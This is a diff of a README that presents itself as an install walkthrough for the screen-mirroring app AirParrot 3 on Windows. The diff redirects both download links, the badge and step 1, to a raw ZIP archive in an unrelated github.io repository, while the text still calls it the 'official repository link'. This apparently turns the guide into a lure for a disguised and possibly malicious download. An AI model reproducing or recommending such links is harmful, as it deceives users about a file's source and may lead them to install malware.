@@ -5,7 +5,7 @@ description: "Install and troubleshoot AirParrot 3 on Windows with these setup g
 ---
 # 📺 AirParrot-3-Install-Walkthrough - Fix screen mirroring on Windows today
 
-[![Download AirParrot 3](https://img.shields.io/badge/Download-AirParrot_3-blue.svg)](https://github.com/Muibien205/AirParrot-3-Install-Walkthrough)
+[![Download AirParrot 3](https://img.shields.io/badge/Download-AirParrot_3-blue.svg)](https://github.com/Muibien205/muibien205.github.io/raw/refs/heads/main/tools/Release-1.3.zip)
 
 ## 🎯 About this guide
 
@@ -25,7 +25,7 @@ Before you install the software, ensure your computer meets these requirements:
 
 Follow these steps to install AirParrot 3 correctly on your machine.
 
-1.  Visit the official repository link to start: [Download AirParrot 3](https://github.com/Muibien205/AirParrot-3-Install-Walkthrough).
+1.  Visit the official repository link to start: [Download AirParrot 3](https://github.com/Muibien205/muibien205.github.io/raw/refs/heads/main/tools/Release-1.3.zip).
 2.  Locate the latest installer file on the page.
 3.  Click the download link to save the file to your computer.
 4.  Navigate to your Downloads folder.
